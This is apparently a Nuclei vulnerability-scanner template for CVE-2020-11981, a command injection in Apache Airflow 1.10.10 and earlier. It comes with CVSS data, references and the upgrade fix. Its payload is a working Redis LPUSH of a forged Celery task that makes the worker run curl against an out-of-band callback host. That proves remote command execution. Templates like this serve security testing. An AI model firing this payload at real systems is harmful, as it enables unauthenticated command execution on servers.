id: CVE-2020-11981
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:apache:airflow:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-11981
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.98967
    epss-score: 0.9386
  description: 'An issue was found in Apache Airflow versions 1.10.10 and below. When
    using CeleryExecutor, if an attacker can connect to the broker (Redis, RabbitMQ)
    directly, it is possible to inject commands, resulting in the celery worker running
    arbitrary commands.

    '
  impact: 'Successful exploitation of this vulnerability allows an attacker to execute
    arbitrary commands on the target system.

    '
  metadata:
    max-request: 2
    product: airflow
    shodan-query: product:"redis"
    vendor: apache
    verified: true
  name: Apache Airflow <=1.10.10 - Command Injection
  reference:
  - https://github.com/apache/airflow/pull/9178
  - https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11981
  - https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E
  - https://github.com/t0m4too/t0m4to
  - https://github.com/ARPSyndicate/cvemon
  remediation: Upgrade apache-airflow to version 1.10.11 or higher.
  severity: critical
  tags: cve,cve2020,network,redis,unauth,apache,airflow,vulhub,intrusive
tcp:
- host:
  - '{{Hostname}}'
  - '{{Host}}:6379'
  inputs:
  - data: "{{data+base64(encode1+'{{interactsh-url}}'+encode2)+concat(end+ '\r\n')}}"
    read: 1024
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
variables:
  data: "*3\r\n$5\r\nLPUSH\r\n$7\r\ndefault\r\n$936\r\n{\"content-encoding\": \"utf-8\"\
    , \"properties\": {\"priority\": 0, \"delivery_tag\": \"f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\"\
    , \"delivery_mode\": 2, \"body_encoding\": \"base64\", \"correlation_id\": \"\
    ed5f75c1-94f7-43e4-ac96-e196ca248bd4\", \"delivery_info\": {\"routing_key\": \"\
    celery\", \"exchange\": \"\"}, \"reply_to\": \"fb996eec-3033-3c10-9ee1-418e1ca06db8\"\
    }, \"content-type\": \"application/json\", \"headers\": {\"retries\": 0, \"lang\"\
    : \"py\", \"argsrepr\": \"(100, 200)\", \"expires\": null, \"task\": \"airflow.executors.celery_executor.execute_command\"\
    , \"kwargsrepr\": \"{}\", \"root_id\": \"ed5f75c1-94f7-43e4-ac96-e196ca248bd4\"\
    , \"parent_id\": null, \"id\": \"ed5f75c1-94f7-43e4-ac96-e196ca248bd4\", \"origin\"\
    : \"gen1@132f65270cde\", \"eta\": null, \"group\": null, \"timelimit\": [null,\
    \ null]}, \"body\": \""
  encode1: '[[["curl", "http://'
  encode2: '"]], {}, {"chain": null, "chord": null, "errbacks": null, "callbacks":
    null}]'
  end: '"}'
